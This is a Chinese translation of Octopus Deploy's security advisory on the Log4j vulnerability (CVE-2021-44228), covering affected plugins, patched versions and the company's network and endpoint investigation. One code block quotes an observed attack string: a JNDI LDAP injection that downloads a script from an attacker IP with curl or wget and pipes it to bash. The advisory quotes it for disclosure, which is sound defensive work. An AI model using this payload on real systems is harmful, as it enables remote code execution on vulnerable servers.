<html>
<head>
<title>Octopus Deploy's response to Log4j - Octopus Deploy</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>Octopus Deploy对Log4j的回应- Octopus Deploy</h1>
<blockquote>原文：<a href="https://octopus.com/blog/octopus-deploy-log4j-response#2021-12-14">https://octopus.com/blog/octopus-deploy-log4j-response#2021-12-14</a></blockquote>
                        <p>2021年12月9日，星期四，Octopus Deploy获悉Log4j日志记录实用程序(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228" rel="nofollow"> CVE-2021-44228 </a>)中存在漏洞。我们立即制定了安全事件响应计划，以调查我们对该实用程序的使用及其对我们的产品和基础架构的影响。</p>

<p>幸运的是，章鱼云、章鱼服务器、章鱼触手不受影响。但是，有一些相关产品受到影响，需要更新。</p>

<p>在本帖中，我们分享了我们的调查结果以及我们为客户推荐的后续步骤。</p>

<h2 id="jetbrains-teamcity-plugin-for-octopus-deploy">用于Octopus部署的JetBrains团队城市插件</h2>

<p>JetBrains TeamCity插件的6.1.7版本使用Log4j的2.15.0版本。但是，6.1.7之前的所有插件版本都使用Log4j的2.14.1版本，因此可能容易受到远程代码执行的攻击。</p>

<h3 id="what-you-need-to-do">你需要做什么</h3>

<p>TeamCity的Octopus Deploy插件版本6.1.7可从市场上获得。如果您是TeamCity用户，您应该会通过Web用户界面得到此更新的通知，我们强烈建议您安装此更新。</p>

<p>关注我们的<a href="https://advisories.octopus.com/adv/2021-12---Octopus-Deploy-TeamCity-Plugin-log4j2-dependency.2306410241.html" rel="nofollow">安全顾问</a>获取更新。</p>

<h2 id="octopus-java-sdk">Octopus Java SDK</h2>

<p>Java SDK的0.0.3版使用Log4j的2.15.0版。但是，0.0.3之前的所有Java SDK版本都使用Log4j的2.14.1版本，因此容易受到远程代码执行的攻击。</p>

<h3 id="what-you-need-to-do-1">你需要做什么</h3>

<p>我们建议使用Octopus Java SDK的客户将其SDK版本更新到0.0.3。</p>

<p>关注我们的<a href="https://advisories.octopus.com/adv/2021-13---Octopus-Java-Client-SDK-log4j2-dependency.2306475696.html" rel="nofollow">安全顾问</a>获取更新。</p>

<h2 id="octopus-cloud-octopus-server-and-octopus-tentacle">章鱼云、章鱼服务器和章鱼触手</h2>

<p>章鱼云、章鱼服务器、章鱼触手不受此漏洞影响。它们是用。NET框架，不要使用Log4j的任何移植版本。</p>

<h2 id="breakdown-of-all-products">所有产品的明细</h2>

<table class="table">
<thead>
<tr>
<th>产品</th>
<th>使用了易受攻击的Log4j版本</th>
<th>易受攻击的产品版本</th>
<th>修补的产品版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>Azure Devops &amp; TFS扩展</td>
<td>不</td>
<td>不适用的</td>
<td>不适用的</td>
</tr>
<tr>
<td>竹子附加物</td>
<td>不</td>
<td>不适用的</td>
<td>不适用的</td>
</tr>
<tr>
<td>Java SDK</td>
<td>是</td>
<td>⇐ 0.0.2</td>
<td>0.0.3</td>
</tr>
<tr>
<td>Jenkins插件</td>
<td>不</td>
<td>不适用的</td>
<td>不适用的</td>
</tr>
<tr>
<td>Octopus CLI</td>
<td>不</td>
<td>不适用的</td>
<td>不适用的</td>
</tr>
<tr>
<td>章鱼云</td>
<td>不</td>
<td>不适用的</td>
<td>不适用的</td>
</tr>
<tr>
<td>章鱼服务器</td>
<td>不</td>
<td>不适用的</td>
<td>不适用的</td>
</tr>
<tr>
<td>章鱼触手</td>
<td>不</td>
<td>不适用的</td>
<td>不适用的</td>
</tr>
<tr>
<td>TeamCity Plugin</td>
<td>Yes</td>
<td>⇐ 6.1.5</td>
<td>6.1.7</td>
</tr>
</tbody>
</table>

<h2 id="was-octopus-deploy-compromised">Octopus部署受到威胁了吗？</h2>

<p>我们的内部基础设施运行使用易受攻击的Log4j版本的产品。然而，在12月9日星期四的最初公告后，我们投入了大量时间，我们相信Octopus Deploy没有受到影响。</p>

<p>当我们的工程团队努力更新受影响的产品时，我们的安全运营团队分析了我们的系统，以确定它们是否被利用了。接下来的部分将进一步深入我们的方法。</p>

<h3 id="reviewing-our-internal-infrastructure">审查我们的内部基础设施</h3>

<p>我们内部基础设施的绝大部分是作为代码基础设施(IaC)来维护的。这使我们能够轻松识别潜在的易受攻击系统，并以最少的干预将更新推送到这些系统。</p>

<p>当我们无法确定系统是否易受攻击时，我们使用已知概念证明(PoC)来测试系统是否易受攻击。这意味着我们可以更好地减轻特定系统。</p>

<h3 id="reviewing-network-traffic">查看网络流量</h3>

<p>我们在整个基础架构中维护大量网络数据，这使我们能够识别可能导致基础架构被利用的可疑网络行为。在审查网络数据时，我们发现了以下问题:</p>

<ol>
<li>可疑活动-我们发现了进入我们系统的可疑入站网络流量，包括源IP。然而，我们没有发现任何令人放心的恶意出站流量。</li>
<li>确定目标系统-在分析网络数据时，我们确定了被攻击的特定系统。我们对这些系统采取了额外的控制和缓解措施，以降低被利用的风险。</li>
</ol>

<p>下面是一个用户代理字符串，它被发送到我们的一个服务器上(经过解码和编辑):</p>

<pre><code>${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/(curl -s 45.155.205.233:5874/XXX.XXX.XXX.XXX:443||wget -q -O- 45.155.205.233:5874/XXX.XXX.XXX.XXX:443)|bash}
</code></pre>

<h3 id="reviewing-endpoints">审查终点</h3>

<p>使用来自网络数据的信息，我们审查了我们知道已经成为攻击目标的特定终端，并确认它们没有受到威胁。</p>

<p>通过在我们的终端上使用EDR解决方案，我们还密切监控终端的危害或潜在利用迹象。这些数据(以及其他数据集)被输入到我们的SIEM(安全事件和事件管理)系统中，因此我们可以获得近乎实时的警报，并做出相应的响应。</p>

<p>使用所有这些方法来调查我们的基础设施，我们没有发现任何妥协的证据。</p>

<h2 id="conclusion">结论</h2>

<p>我们将继续跟踪与此漏洞相关的更新。如果我们的客户或产品存在任何风险，我们将提供进一步的更新。</p>

<p>如果您有任何问题，请通过<a href="mailto:support@octopus.com" rel="nofollow">support@octopus.com</a>联系。</p>

                    
                    
</body>
</html>